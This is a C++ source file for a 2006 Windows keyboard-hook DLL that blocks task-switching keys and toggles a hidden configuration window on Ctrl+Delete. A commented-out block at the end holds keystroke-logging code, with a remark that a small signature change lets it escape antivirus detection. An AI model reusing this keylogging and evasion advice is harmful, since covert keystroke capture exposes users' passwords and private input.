// kbdhook.cpp : Defines the exported functions for the DLL application.
// Author: Ovais Reza
// (c) Whambox 2006

#include "stdafx.h"

//int DisableTaskKeys(int bEnable, int gs_bBeep);
//int AreTaskKeysDisabled();
//
int		IsHotKeyPressed();
int		SetConfigurationDialog(HWND hwnd);
int		InstallKbdHook();
int		UninstallKbdHook();
void	SetTaskKeyDisable(BOOL enable);
int		IsHookInstalled();
BOOL	IsTaskKeysDisabled();

//Globals
HINSTANCE g_appInstance = NULL;
HWND g_hwnd = NULL;

// Shared data section
#pragma data_seg (".mydata")
HHOOK gs_hHookKbdLL = NULL;				// Hook handle
BOOL  gs_bBeep = FALSE;					// Beep on illegal key
BOOL  gs_bHotKeyPressed  = FALSE;		// Was hot key pressed
BOOL  gs_taskKeyDisabled = FALSE;		// Are task key disabled/enabled
#pragma data_seg ()
#pragma comment(linker, "/SECTION:.mydata,RWS")


void ShowConfigurationDialog(int nCode, LPARAM lp)
{

	KBDLLHOOKSTRUCT *pkbdhook = (KBDLLHOOKSTRUCT *) lp;

	if (nCode==HC_ACTION)
	{
      BOOL bCtrlKeyDown = GetAsyncKeyState(VK_CONTROL)>>((sizeof(SHORT) * 8) - 1);
	  BOOL bDelDown = GetAsyncKeyState(VK_DELETE)>>((sizeof(SHORT) * 8) - 1);

	  if (bCtrlKeyDown && bDelDown)
	  {
			OutputDebugString("ShowConfigurationDialog: Hot key pressed pressed.\n");
			gs_bHotKeyPressed = TRUE;
			//
			if (IsWindowVisible(g_hwnd))
			{
				ShowWindow(g_hwnd,SW_HIDE);
			}
			else
			{
				ShowWindow(g_hwnd,SW_SHOW);
			}
	  }
	}
}



// Main hook callback function
// Standard Keyboard hook, see the call back function prototype in MSDN
LRESULT CALLBACK KdbHook(int nCode, WPARAM wp, LPARAM lp)
{
   KBDLLHOOKSTRUCT *pkbdhook = (KBDLLHOOKSTRUCT *) lp;

   ShowConfigurationDialog(nCode, lp);

   if (gs_taskKeyDisabled == FALSE)
   {
	   if (nCode==HC_ACTION)
	   {
		  BOOL bCtrlKeyDown = GetAsyncKeyState(VK_CONTROL)>>((sizeof(SHORT) * 8) - 1);
		  if ((pkbdhook->vkCode==VK_ESCAPE && bCtrlKeyDown) || // Ctrl+Esc
			  (pkbdhook->vkCode==VK_TAB && pkbdhook->flags & LLKHF_ALTDOWN) ||   // Alt+TAB
			  (pkbdhook->vkCode==VK_ESCAPE && pkbdhook->flags & LLKHF_ALTDOWN)|| // Alt+Esc
			  (pkbdhook->vkCode==VK_LWIN || pkbdhook->vkCode==VK_RWIN) ||
			  (bCtrlKeyDown && pkbdhook->vkCode==LLKHF_ALTDOWN && pkbdhook->vkCode == VK_DELETE))
			  {
			   return 1;
			  }
	   }
   }
   return CallNextHookEx(gs_hHookKbdLL, nCode, wp, lp);
}

//Check if the shared variable is not set & Install keyboard hook
int InstallKbdHook()
{
	int retValue = 0;
	if (!gs_hHookKbdLL)
	{
         gs_hHookKbdLL = SetWindowsHookEx(WH_KEYBOARD_LL, KdbHook, g_appInstance, 0);
		 OutputDebugString("InstallKbdHook: Hooked installed.\n");
    }

	if (gs_hHookKbdLL != NULL)
	{
		retValue = 1;
	}
	return retValue;
}

//Save the handle for configuration dialogbox which is passed in to this DLL,
//so we can invoke it on key press
int SetConfigurationDialog(HWND hwnd) {
	if (hwnd != NULL) {
		g_hwnd = hwnd;
		return 1;
	}
	return -1;
}

//Check if hot key is pressed
int IsHotKeyPressed()
{
	return gs_bHotKeyPressed;
}

//Enable or disable task keys
void SetTaskKeyDisable(BOOL enable)
{
	gs_taskKeyDisabled = enable;
}

//Check if task keys are disabled
BOOL IsTaskKeysDisabled()
{
	return gs_taskKeyDisabled;
}

//Check if hook is installed
int IsHookInstalled()
{
   return gs_hHookKbdLL != NULL;
}

//Uninstall keyboard hook
int UninstallKbdHook()
{
	 int retVal = 0;
	 if (gs_hHookKbdLL != NULL)
	  {
		  retVal = UnhookWindowsHookEx(gs_hHookKbdLL);
		  gs_hHookKbdLL = NULL;
		  OutputDebugString("UninstallKbdHook: Hooked uninstalled.\n");
      }
	 return retVal;
}



/*
// We don't need this code
// Alway have shifty handy, this function is commonly detected by anti's
// A small modificatin of signature is sufficient to escape

LRESULT OnInterceptKeyStroke(WPARAM wParam, LPARAM lParam)
{
    //If we are logging a new application we should print an appropriate header

    if (g_hWinInFocus != g_hLastWin)
    {
        WriteNewAppHeader(g_hWinInFocus);
        g_hLastWin = g_hWinInFocus;
    }

    if (wParam==VK_RETURN || wParam==VK_TAB)
    {
        WriteToLog('\n');
    }
    else
    {
        BYTE keyStateArr[256];
        WORD word;
        UINT scanCode = lParam;
        char ch;

        //Translate virtual key code to ascii

        GetKeyboardState(keyStateArr);
        ToAscii(wParam, scanCode, keyStateArr, &word, 0);
        ch = (char) word;

        if ((GetKeyState(VK_SHIFT) & 0x8000) && wParam >= 'a' && wParam <= 'z')
            ch += 'A'-'a';

        WriteToLog(ch);

    }
    return 0;
}

// Categorize input based on protocol
void categorizeBasedOnProtocol(LPVOID ptr)
{

}
*/
